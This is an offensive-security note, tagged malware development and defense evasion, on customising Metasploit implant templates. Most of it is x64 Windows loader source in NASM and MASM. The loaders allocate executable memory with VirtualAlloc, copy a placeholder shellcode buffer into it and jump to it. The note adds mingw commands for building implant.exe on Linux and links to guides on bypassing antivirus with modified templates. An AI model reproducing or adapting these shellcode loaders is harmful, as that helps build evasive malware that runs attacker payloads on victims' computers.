---
author(s):
  - Userware
tags:
  - helpers
  - malware-development
  - defense-evasion
---
# String Substitution

There is a limitation with this method. It uses a few supported payload formats (refer to the [[Metasploit Implant Templates References|table reference]]).

TODO: Write steps to compile EXE and copy in the templates file destination

## 01 - EXE

### 1.1 - NASM

```nasm
extern ExitProcess
extern VirtualAlloc

section .data
    payload db 'PAYLOAD:', 4096-8 dup (0)

section .text
    global main
    global _start

_start:
    call main
    xor rcx, rcx               ; Exit code 0
    call ExitProcess           ; ExitProcess(0)

main:
    sub rsp, 40                ; Allocate shadow space for function calls (Windows x64 ABI requirement)

    mov r9, 40h                ; PAGE_EXECUTE_READWRITE
    mov r8, 3000h              ; MEM_COMMIT | MEM_RESERVE
    mov rdx, 4096              ; Size of memory allocation
    xor rcx, rcx               ; NULL for lpAddress
    call VirtualAlloc          ; lpPayload = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

    mov rcx, 4096              ; Size of payload to copy
    mov rsi, payload           ; Source address
    mov rdi, rax               ; Destination address (lpPayload)
    rep movsb                  ; memcpy(lpPayload, payload, 4096)

    call rax                   ; Execute the payload
```

Compile Windows binaries in Linux

```
$ nasm -f win64 implant.asm -o implant.obj

$ x86_64-w64-mingw32-ld -b pe-x86-64 -e _start -lkernel32 -o implant.exe implant.obj
```

### 1.2 - MASM

```nasm
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Architecture: x64
;
; Assemble and link with the following command:
; "C:\Program Files\Microsoft Visual Studio 9.0\VC\bin\x86_amd64\ml64" template_x64_windows.asm /link /subsystem:windows /defaultlib:"C:\Program Files\Microsoft SDKs\Windows\v6.0A\Lib\x64\kernel32.lib" /entry:main 

extrn ExitProcess : proc
extrn VirtualAlloc : proc

.code

	main proc
		sub rsp, 40        ; Allocate shadow space for function calls (Windows x64 ABI requirement)
		mov r9, 40h        ; PAGE_EXECUTE_READWRITE
		mov r8, 3000h      ; MEM_COMMIT | MEM_RESERVE
		mov rdx, 4096      ; Size of memory allocation
		xor rcx, rcx       ;
		call VirtualAlloc  ; lpPayload = VirtualAlloc( NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
		mov rcx, 4096      ;
		mov rsi, payload   ;
		mov rdi, rax       ;
		rep movsb          ; memcpy( lpPayload, payload, 4096 );
		call rax           ; lpPayload();
		xor rcx, rcx       ;
		call ExitProcess   ; ExitProcess( 0 );
	main endp

	payload proc
		A byte 'PAYLOAD:'
		B db 4096-8 dup ( 0 )
	payload endp
end
```

---
## References

### Implants

- [Rapid7: Metasploit Framework PE Templates Source](https://github.com/rapid7/metasploit-framework/tree/master/data/templates/src/pe/exe)

### How to Modify Implant Templates

- [Red Team Notes: AV Bypass with Metasploit Templates and Custom Binaries](https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates)

- [Modifying Metasploit x64 template for AV evasion](http://blog.packetheader.net/2015/10/modifying-metasploit-x64-template-for_29.html)

- [Black Hills Information Security: Modifying Metasploit x64 template for AV evasion](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/)